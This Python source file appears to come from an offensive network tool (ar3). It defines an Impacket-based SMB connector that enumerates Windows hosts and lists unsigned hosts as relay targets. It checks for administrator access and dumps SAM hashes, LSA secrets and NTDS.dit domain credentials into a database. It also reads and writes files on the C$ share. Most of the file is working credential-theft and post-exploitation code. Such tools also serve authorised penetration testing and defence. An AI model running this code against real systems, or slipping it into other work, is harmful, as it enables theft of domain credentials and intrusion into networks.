import os
from random import choice
from impacket.dcerpc.v5 import scmr
from impacket.smb import SMB_DIALECT
from string import ascii_letters, digits
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.transport import SMBTransport
from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP
from impacket.smbconnection import SMBConnection, SessionError
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
from impacket.examples.secretsdump import RemoteOperations, SAMHashes, NTDSHashes, LSASecrets

from ar3.helpers import remotefile
from ar3.core.connector import Connector
from ar3.ops.enum.polenum import SAMRDump
from ar3.helpers.misc import validate_ntlm, get_filestamp

class SmbCon(Connector):
    def __init__(self, args, loggers, host, db):
        Connector.__init__(self, args, loggers, host)
        self.auth       = False
        self.con        = False
        self.client     = ''.join([choice(ascii_letters + digits) for x in range(7)])
        self.smbv1      = False
        self.os         = ''
        self.admin      = False
        self.signing    = False
        self.os_arch    = ''
        self.remote_ops = None
        self.bootkey    = None
        self.db         = db
        self.port       = 445

    #########################
    # Session Management
    #########################
    def create_smb_con(self):
        # @TODO refactor, called by spider & file search to create con
        if self.smb_connection():
            try:
                self.login()
            except Exception as e:
                raise Exception(str(e))
        else:
            raise Exception('Connection to Server Failed')

    def login(self):
        self.con.login(self.username, self.password, self.domain, lmhash=self.lmhash, nthash=self.nthash)
        self.auth = True
        self.isAdmin()
        self.updatedb_user()


    def updatedb_user(self):
        if self.username and self.password or self.username and self.hash:
            self.db.update_user(self.username, self.password, self.domain, self.hash)
            if self.admin:
                self.db.update_admin(self.username, self.domain, self.host)

    def logoff(self):
        self.con.logoff()

    def close(self):
        try:
            self.con.logoff()
        except:
            pass

        try:
            self.con.close()
        except:
            pass


    ################################
    #
    # SMB Connection
    #
    ################################
    def smb_connection(self):
        if self.smbv1_con():
            return True
        elif self.smbv3_con():
            return True
        return False

    def smbv1_con(self):
        try:
            self.con = SMBConnection(self.client, self.ip, sess_port=self.port, preferredDialect=SMB_DIALECT, timeout=int(self.timeout))
            self.smbv1=True
            self.con.setTimeout(self.timeout)
            self.logger.debug('SMBv1: Connected to: {}'.format(self.ip))
            return True
        except Exception as e:
            self.logger.debug('SMBv1: Error creating connection to {}: {}'.format(self.host, e))
            return False

    def smbv3_con(self):
        try:
            self.con = SMBConnection(self.client, self.ip, sess_port=self.port, timeout=int(self.timeout))
            self.con.setTimeout(self.timeout)
            self.logger.debug('SMBv3: Connected to: {}'.format(self.ip))
            return True
        except Exception as e:
            self.logger.debug('SMBv3: Error creating connection to {}: {}'.format(self.ip, e))
            return False

    #########################
    # Authentication (NOT IN USE)
    #########################
    def set_host(self, local_auth):
        # Get domain for authentication purposes
        if local_auth:
            self.domain = self.con.getServerName() + "." + self.con.getServerDNSDomainName()
        else:
            self.domain = self.con.getServerDNSDomainName()
        # Backup for Linux/Unix systems
        if not self.domain:
            self.domain = self.con.getServerName() + "." + self.con.getServerDNSDomainName()

    ################################
    # Enumerate Host information
    ################################
    def host_info(self):
        try:
            self.con.login('', '')
        except SessionError as e:
            if "STATUS_ACCESS_DENIED" in e.getErrorString():
                pass

        self.srvdomain  = self.con.getServerDomain()       # Demo
        self.host       = self.get_hostname()
        self.os         = self.con.getServerOS()           # Windows 10 Build 17134
        self.signing    = self.con.isSigningRequired()     # True/False

        if not self.srvdomain:
            self.srvdomain = self.con.getServerName()

        arch = self.get_os_arch()
        if arch != 0:
            self.os_arch = " x{}".format(str(arch))

        if self.con.getServerDNSDomainName():
            domain = self.con.getServerDNSDomainName()
        else:
            domain = self.ip

        try:
            # Log off before attempting new auth
            self.logoff()
        except:
            pass

        self.db.update_host(self.host, self.ip, domain, self.os, self.signing)

        if self.args.gen_relay_list and not self.signing:
            self.loggers['relay_list'].info(self.ip)

        self.smb_connection()

    def get_os_arch(self):
        # Credit: https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/smb.py
        # Credit: https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_19/examples/getArch.py
        try:
            stringBinding = r'ncacn_ip_tcp:{}[135]'.format(self.host)
            transport = DCERPCTransportFactory(stringBinding)
            transport.set_connect_timeout(5)
            dce = transport.get_dce_rpc()
            dce.connect()
            try:
                dce.bind(MSRPC_UUID_PORTMAP, transfer_syntax=('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0'))
            except DCERPCException as e:
                if str(e).find('syntaxes_not_supported') >= 0:
                    dce.disconnect()
                    return 32
            else:
                dce.disconnect()
                return 64
        except:
            return 0

    def get_hostname(self):
        if self.con.getServerDNSDomainName() and (self.con.getServerName().lower() != self.con.getServerDNSDomainName().lower()):
                return (self.con.getServerName() + "." + self.con.getServerDNSDomainName())
        else:
            return self.con.getServerName()


    def list_shares(self):
        # name=share['shi1_netname'][:-1], description=share['shi1_remark']
        return self.con.listShares()

    ################################
    # Host/Domain Password Policy
    ################################
    def password_policy(self):
        SAMRDump(self).dump(self.host)

    ################################
    # List Shares & Check Share Permissions
    ################################
    def read_perm(self, share):
        try:
            # Silently list path to check access
            self.list_path(share, False)
            return True
        except:
            return False

    def write_perm(self, share):
        try:
            # Create dir to check write access
            tmp = '.' + ''.join([choice(ascii_letters + digits) for x in range(5)])
            self.con.createDirectory(share, tmp)
            self.con.deleteDirectory(share, tmp)
            return True
        except Exception as e:
            return False

    def list_path(self, share, path):
        if not path:
            path = '/*'
        return self.con.listPath(share, path)

    ################################
    # Check if User Admin
    ################################
    def isAdmin(self):
        try:
            rpctransport = SMBTransport(self.host, self.port, r'\svcctl', smb_connection=self.con)
            dce = rpctransport.get_dce_rpc()
            try:
                dce.connect()
            except:
                pass
            else:
                dce.bind(scmr.MSRPC_UUID_SCMR)
                try:
                    # 0xF003F - SC_MANAGER_ALL_ACCESS
                    # http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
                    ans = scmr.hROpenSCManagerW(dce, '{}\x00'.format(self.host), 'ServicesActive\x00', 0xF003F)
                    self.admin = True
                    return True
                except scmr.DCERPCException as e:
                    pass
        except Exception as e:
            print(e)
        return False

    ################################
    # Dump SAM / LSA
    #   Methods were modified from:
    #     https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/smb.py
    #     https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
    ################################
    def enable_remoteops(self):
        try:
            self.remote_ops = RemoteOperations(self.con, False, None)
            self.remote_ops.enableRegistry()
            self.bootkey = self.remote_ops.getBootKey()
        except Exception as e:
            self.logger.fail('RemoteOperations failed for {}: {}'.format(self.host, str(e)))

    def sam(self):
        def add_sam_hash(sam_hash, host):
            self.logger.success([self.host, self.ip, "SAM HASH", sam_hash])
            username, _, lmhash, nthash, _, _, _ = sam_hash.split(':')
            self.db.update_user(username, '', host, "{}:{}".format(lmhash, nthash))
            add_sam_hash.added_to_db += 1

        try:
            # Output File
            file_name = '{}_{}'.format(self.host.lower(), get_filestamp())
            outfile = os.path.join(os.path.expanduser('~'), '.ar3', 'workspaces', self.args.workspace, file_name)

            add_sam_hash.added_to_db = 0
            self.enable_remoteops()
            if self.remote_ops and self.bootkey:
                SAMFileName = self.remote_ops.saveSAM()
                SAM = SAMHashes(SAMFileName, self.bootkey, isRemote=True, perSecretCallback=lambda secret: add_sam_hash(secret, self.host))
                SAM.dump()
                SAM.export(outfile)
        except Exception as e:
            self.logger.debug('SAM Extraction Failed for {}: {}'.format(self.host, str(e)))

        if add_sam_hash.added_to_db > 0:
            self.logger.success([self.host, self.ip, "SAM HASH", '{} hashes added to the database'.format(add_sam_hash.added_to_db)])
            self.logger.info([self.host, self.ip, "SAM HASH", 'Output saved to: {}.sam'.format(outfile)])

        try:
            self.remote_ops.finish()
        except Exception as e:
            self.logger.debug(["SAM", "Error calling remote_ops.finish(): {}".format(e)])
        SAM.finish()

    def lsa(self):
        def add_lsa_secret(secret):
            for x in secret.splitlines():
                self.logger.success([self.host, self.ip, "LSA SECRET", x])
                add_lsa_secret.secrets += 1

        try:
            # Output File
            file_name = '{}_{}'.format(self.host.lower(), get_filestamp())
            outfile = os.path.join(os.path.expanduser('~'), '.ar3', 'workspaces', self.args.workspace, file_name)
            # Dump
            add_lsa_secret.secrets = 0
            self.enable_remoteops()
            if self.remote_ops and self.bootkey:
                SECURITYFileName = self.remote_ops.saveSECURITY()
                LSA = LSASecrets(SECURITYFileName, self.bootkey, self.remote_ops, isRemote=True, perSecretCallback=lambda secretType, secret: add_lsa_secret(secret))
                LSA.dumpCachedHashes()
                LSA.exportCached(outfile)
                LSA.dumpSecrets()
                LSA.exportSecrets(outfile)
        except Exception as e:
            self.logger.debug('LSA Extraction Failed for {}: {}'.format(self.host, str(e)))

        if add_lsa_secret.secrets > 0:
            self.logger.info([self.host, self.ip, "LSA SECRET", 'Output saved to: {}.secrets'.format(outfile)])

        try:
            self.remote_ops.finish()
        except Exception as e:
            self.logger.debug(["LSA", "Error calling remote_ops.finish(): {}".format(e)])
        LSA.finish()

    def ntds(self):
        def add_ntds_hash(ntds_hash):
            if ntds_hash.find('$') == -1:
                if "CLEARTEXT" in ntds_hash:
                    try:
                        username, password = ntds_hash.split(":CLEARTEXT:")
                        add_ntds_hash.clear_text += 1
                        domain, username = username.split("\\")
                        self.db.update_user(username, password, domain, '')
                        add_ntds_hash.added_to_db += 1
                    except:
                        self.logger.fail("Error adding clear text cred to db: {}".format(ntds_hash))
                else:
                    if ntds_hash.find('\\') != -1:
                        domain, hash = ntds_hash.split('\\')
                    else:
                        domain = self.domain
                        hash = ntds_hash

                    try:
                        username, _, lmhash, nthash, _, _, _ = hash.split(':')
                        parsed_hash = ':'.join((lmhash, nthash))
                        if validate_ntlm(parsed_hash):
                            add_ntds_hash.ntds_hashes += 1
                            self.db.update_user(username, '', domain, "{}:{}".format(lmhash,nthash))
                            add_ntds_hash.added_to_db += 1
                    except:
                        self.logger.debug("Skipping non-NTLM hash: {}".format(ntds_hash))
            else:
                self.logger.debug("Skipping computer account")

        try:
            self.enable_remoteops()
            use_vss_method = self.args.use_vss
            NTDSFileName = None
            add_ntds_hash.ntds_hashes = 0
            add_ntds_hash.clear_text = 0
            add_ntds_hash.added_to_db = 0
            # Output File
            file_name = '{}_{}'.format(self.host.lower(), get_filestamp())
            outfile = os.path.join(os.path.expanduser('~'), '.ar3', 'workspaces', self.args.workspace, file_name)

            if self.remote_ops and self.bootkey:
                if self.args.ntds is 'vss':
                    NTDSFileName = self.remote_ops.saveNTDS()
                    use_vss_method = True

                NTDS = NTDSHashes(NTDSFileName, self.bootkey, isRemote=True, history=False, noLMHash=True,
                                  remoteOps=self.remote_ops, useVSSMethod=use_vss_method, justNTLM=False,
                                  pwdLastSet=False, resumeSession=None, outputFileName=outfile,
                                  justUser=None, printUserStatus=False,
                                  perSecretCallback=lambda secretType, secret: add_ntds_hash(secret))

                self.logger.info([self.host, self.ip, "NTDS", 'Extracting NTDS.dit, this could take a few minutes...'])
                NTDS.dump()

                self.logger.success([self.host, self.ip, "NTDS", '{} hashes and {} passwords collected'.format(add_ntds_hash.ntds_hashes, add_ntds_hash.clear_text)])
                self.logger.success([self.host, self.ip, "NTDS", '{} creds added to the database'.format(add_ntds_hash.added_to_db)])
                self.logger.info([self.host, self.ip, "NTDS", 'Hash files located at: {}'.format(outfile)])

            else:
                raise Exception("RemoteOps and BootKey not initiated")
        except Exception as e:
            self.logger.fail('NTDS Extraction Failed for {}: {}'.format(self.host, str(e)))

        try:
            self.remote_ops.finish()

        except Exception as e:
            self.logger.debug(["NTDS", "Error calling remote_ops.finish(): {}".format(e)])
        NTDS.finish()

    ################################
    # File Interaction
    ################################
    def createFile(self, filename, data, share='C$'):
        # Create new file & write data, Not In Use
        f = remotefile.RemoteFile(self.con, filename, share)
        f.create()
        f.write(data)
        f.close()

    def uploadFile(self, local_file, location, share='C$'):
        f = open(local_file, 'rb')
        self.con.putFile(share, location, f.read)
        f.close()

    def downloadFile(self, remote_file, location='ar3_download', remote_share='C$'):
        f = open(location, 'wb')
        self.con.getFile(remote_share, remote_file, f.write)
        f.close()

    def deleteFile(self, remote_file, share='C$'):
        self.con.deleteFile(share, remote_file.replace('\\','/'))